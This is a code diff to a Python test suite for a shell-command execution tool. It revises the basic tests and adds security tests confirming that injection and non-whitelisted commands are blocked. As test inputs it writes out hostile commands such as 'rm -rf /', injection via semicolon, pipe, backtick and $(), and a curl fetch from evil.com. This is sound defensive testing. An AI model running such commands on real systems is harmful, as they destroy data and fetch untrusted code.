@@ -546,7 +546,15 @@ class TestExecuteCommandTool:
 
     def test_execute_simple_command(self, execute_command_fn, mock_workspace, mock_secure_path):
         """Executing a simple command returns output."""
-        result = execute_command_fn(command="echo 'Hello World'", **mock_workspace)
+        result = execute_command_fn(command="echo Hello World", **mock_workspace)
+
+        assert result["success"] is True
+        assert result["return_code"] == 0
+        assert "Hello World" in result["stdout"]
+
+    def test_execute_command_with_quotes(self, execute_command_fn, mock_workspace, mock_secure_path):
+        """Executing a command with quoted arguments works correctly."""
+        result = execute_command_fn(command='echo "Hello World"', **mock_workspace)
 
         assert result["success"] is True
         assert result["return_code"] == 0
@@ -554,19 +562,12 @@ class TestExecuteCommandTool:
 
     def test_execute_failing_command(self, execute_command_fn, mock_workspace, mock_secure_path):
         """Executing a failing command returns non-zero exit code."""
-        result = execute_command_fn(command="exit 1", **mock_workspace)
+        # Use a command that actually fails (exit is a shell builtin, not a real command)
+        # Use ls with a non-existent file to get a non-zero exit code
+        result = execute_command_fn(command="ls /nonexistent/path/that/does/not/exist", **mock_workspace)
 
         assert result["success"] is True
-        assert result["return_code"] == 1
-
-    def test_execute_command_with_stderr(
-        self, execute_command_fn, mock_workspace, mock_secure_path
-    ):
-        """Executing a command that writes to stderr captures it."""
-        result = execute_command_fn(command="echo 'error message' >&2", **mock_workspace)
-
-        assert result["success"] is True
-        assert "error message" in result.get("stderr", "")
+        assert result["return_code"] != 0
 
     def test_execute_command_list_files(
         self, execute_command_fn, mock_workspace, mock_secure_path, tmp_path
@@ -581,13 +582,122 @@ class TestExecuteCommandTool:
         assert result["return_code"] == 0
         assert "testfile.txt" in result["stdout"]
 
-    def test_execute_command_with_pipe(self, execute_command_fn, mock_workspace, mock_secure_path):
-        """Executing a command with pipe works correctly."""
-        result = execute_command_fn(command="echo 'hello world' | tr 'a-z' 'A-Z'", **mock_workspace)
+    def test_execute_command_with_cwd(
+        self, execute_command_fn, mock_workspace, mock_secure_path, tmp_path
+    ):
+        """Executing a command with custom working directory works."""
+        # Create a subdirectory and file
+        subdir = tmp_path / "subdir"
+        subdir.mkdir()
+        (subdir / "file.txt").write_text("content")
+
+        result = execute_command_fn(command="ls", cwd="subdir", **mock_workspace)
 
         assert result["success"] is True
         assert result["return_code"] == 0
-        assert "HELLO WORLD" in result["stdout"]
+
+    # === SECURITY TESTS ===
+
+    def test_blocks_command_injection_semicolon(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Command injection via semicolon is blocked."""
+        result = execute_command_fn(command="echo hello; rm -rf /", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_blocks_command_injection_pipe(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Command injection via pipe is blocked."""
+        result = execute_command_fn(command="echo hello | malicious_command", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_blocks_command_injection_backtick(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Command injection via backtick is blocked."""
+        result = execute_command_fn(command="echo `malicious_command`", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_blocks_command_injection_dollar_paren(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Command injection via $(...) is blocked."""
+        result = execute_command_fn(command="echo $(malicious_command)", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_blocks_command_injection_ampersand(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Command injection via & is blocked."""
+        result = execute_command_fn(command="echo hello & malicious_command", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_blocks_dangerous_rm_command(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Dangerous rm -rf command is blocked."""
+        result = execute_command_fn(command="rm -rf /important/data", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_blocks_non_whitelisted_command(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Non-whitelisted commands are blocked."""
+        result = execute_command_fn(command="curl http://evil.com/steal.sh", **mock_workspace)
+
+        assert "error" in result
+        assert "whitelist" in result["error"].lower() or "allowed" in result["error"].lower()
+
+    def test_blocks_command_with_redirect(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Commands with redirects are blocked."""
+        result = execute_command_fn(command="echo hello > file.txt", **mock_workspace)
+
+        assert "error" in result
+        assert "blocked" in result["error"].lower() or "validation" in result["error"].lower()
+
+    def test_allows_whitelisted_command(
+        self, execute_command_fn, mock_workspace, mock_secure_path
+    ):
+        """Whitelisted commands are allowed."""
+        result = execute_command_fn(command="ls -la", **mock_workspace)
+
+        # Should succeed (or fail with file not found, but not validation error)
+        assert "whitelist" not in result.get("error", "").lower()
+        assert "blocked" not in result.get("error", "").lower()
+        assert "validation" not in result.get("error", "").lower()
+
+    def test_allows_whitelisted_command_with_args(
+        self, execute_command_fn, mock_workspace, mock_secure_path, tmp_path
+    ):
+        """Whitelisted commands with arguments are allowed."""
+        (tmp_path / "test.txt").write_text("content")
+
+        result = execute_command_fn(command=f"cat {tmp_path / 'test.txt'}", **mock_workspace)
+
+        assert result["success"] is True
+        assert "content" in result["stdout"]
+
+    def test_blocks_empty_command(self, execute_command_fn, mock_workspace, mock_secure_path):
+        """Empty commands are blocked."""
+        result = execute_command_fn(command="", **mock_workspace)
+
+        assert "error" in result
+        assert "empty" in result["error"].lower() or "validation" in result["error"].lower()
 
 
 class TestApplyDiffTool:
